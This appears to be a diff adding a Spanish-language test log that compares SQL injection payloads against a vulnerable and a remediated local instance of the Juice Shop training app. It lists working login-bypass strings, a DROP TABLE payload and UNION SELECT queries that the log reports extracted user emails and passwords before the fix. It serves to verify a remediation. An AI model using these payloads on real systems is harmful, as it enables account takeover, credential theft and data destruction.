@@ -1,0 +1,22 @@
+
+=== VULNERABLE (http://localhost:3000) ===
+  [login ] ' OR 1=1--                                                 -> HTTP 200 | BYPASS (token admin)
+  [login ] admin@juice-sh.op'--                                       -> HTTP 200 | BYPASS (token admin)
+  [login ] ' OR '1'='1' --                                            -> HTTP 200 | BYPASS (token admin)
+  [login ] '; DROP TABLE Users;--                                     -> HTTP 401 | bloqueado (401)
+  [login ] ' UNION SELECT 1,2,3--                                     -> HTTP 500 | bloqueado (500)
+  [search] qwert')) UNION SELECT id,email,password,1,1,1,1,1,1,1 FR   -> HTTP 200 | EXFILTRACION (24 usuarios)
+  [search] apple')) UNION SELECT 1,email,password,4,5,6,7,8,9,10 FR   -> HTTP 200 | EXFILTRACION (24 usuarios)
+  [search] %' OR 1=1--                                                -> HTTP 500 | error (500)
+  [search] qwert')) AND 1=2--                                         -> HTTP 200 | normal (0 filas)
+
+=== REMEDIADO (http://localhost:3001) ===
+  [login ] ' OR 1=1--                                                 -> HTTP 401 | bloqueado (401)
+  [login ] admin@juice-sh.op'--                                       -> HTTP 401 | bloqueado (401)
+  [login ] ' OR '1'='1' --                                            -> HTTP 401 | bloqueado (401)
+  [login ] '; DROP TABLE Users;--                                     -> HTTP 401 | bloqueado (401)
+  [login ] ' UNION SELECT 1,2,3--                                     -> HTTP 401 | bloqueado (401)
+  [search] qwert')) UNION SELECT id,email,password,1,1,1,1,1,1,1 FR   -> HTTP 200 | normal (0 filas)
+  [search] apple')) UNION SELECT 1,email,password,4,5,6,7,8,9,10 FR   -> HTTP 200 | normal (0 filas)
+  [search] %' OR 1=1--                                                -> HTTP 200 | normal (0 filas)
+  [search] qwert')) AND 1=2--                                         -> HTTP 200 | normal (0 filas)
